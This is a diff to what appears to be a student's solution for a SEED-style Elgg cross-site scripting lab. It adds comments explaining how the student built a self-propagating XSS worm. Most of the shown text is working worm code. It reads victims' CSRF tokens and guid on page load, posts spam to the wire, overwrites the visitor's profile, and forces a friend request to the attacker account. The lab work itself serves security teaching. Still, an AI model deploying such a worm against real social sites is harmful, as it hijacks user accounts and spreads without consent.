@@ -146,6 +146,8 @@ __elgg_token=sWqZS3M83yWXeu6D5soKsw&__elgg_ts=1624257309&body=To+earn+12+USD%2FH
 //solution 4
 <script id="worm" type="text/javascript">
 window.onload = function () {
+	//*** just incorporated first three task so they can work together ... interesting part was I had to add id element in my code... which was a huge realization
+	// here i had to hard code task1's url as this time the visited profile might not be samy but the request should go to samy***	
 	if(elgg.session.user.guid!=elgg.page_owner.guid)
 	{
 		//alert('XSS');
@@ -233,6 +235,7 @@ window.onload = function () {
 		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 		var token="&__elgg_token="+elgg.security.token.__elgg_token;
 		//Construct the content of your url.
+		//***send a wire from a profile to find out send url of the post request and the content of the body... then just modified it like task 2***
 		var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
 		var content=token+ts+"&body=To+earn+12+USD%2FHour%28%21%29%2C+visit+now%0D%0Ahttp%3A%2F%2Fwww.xsslabelgg.com%2Fprofile%2Fsamy"; //FILL IN
 	
@@ -261,6 +264,8 @@ window.onload = function () {
 		var token="&__elgg_token="+elgg.security.token.__elgg_token;
 		var guid = "&guid="+elgg.session.user.guid;
 		//Construct the content of your url.
+		// ****from network tab of firebox I traced out the post request url... and also copy the post request body... then just modified that body to incorporate 
+        // token ts and guid of the visiting user... this modified version will work as the content of the post request****
 		var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
 		var content=ts+token+"&name=seed+ubuntu&description=%3Cp%3Eseed+ubuntu%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1&briefdescription=1605062&accesslevel%5Bbriefdescription%5D=1&location=seed+ubuntu&accesslevel%5Blocation%5D=1&interests=seed+ubuntu&accesslevel%5Binterests%5D=1&skills=seed+ubuntu&accesslevel%5Bskills%5D=1&contactemail=killmeh%40gmail.com&accesslevel%5Bcontactemail%5D=1&phone=seed+ubuntu&accesslevel%5Bphone%5D=1&mobile=seed+ubuntu&accesslevel%5Bmobile%5D=1&website=https%3A%2F%2Fwww.killmeh.com%2Fwebsite&accesslevel%5Bwebsite%5D=1&twitter=seed+ubuntu&accesslevel%5Btwitter%5D=1"+guid //FILL IN
 		//console.log(content);
@@ -294,8 +299,9 @@ window.onload = function () {
 	//var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 	//var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	//Construct the HTTP request to add Samy as a friend.
-	var anchorLink = document.getElementsByClassName('elgg-button');
-	var sendurl = anchorLink[1].getAttribute('href');
+	var anchorLink = document.getElementsByClassName('elgg-button');   // ***add friend button has class elgg-button so finding all the elements under elgg-button
+	var sendurl = anchorLink[1].getAttribute('href'); //from all the elements under elgg-button 2nd element (1st indexed) is a hyperlink that sends the get request
+                                                      //to make friends... so extracting that link... we will use this link as our get request url...***
 	//console.log(sendurl);
 	
 	if(elgg.session.user.guid!=elgg.page_owner.guid)
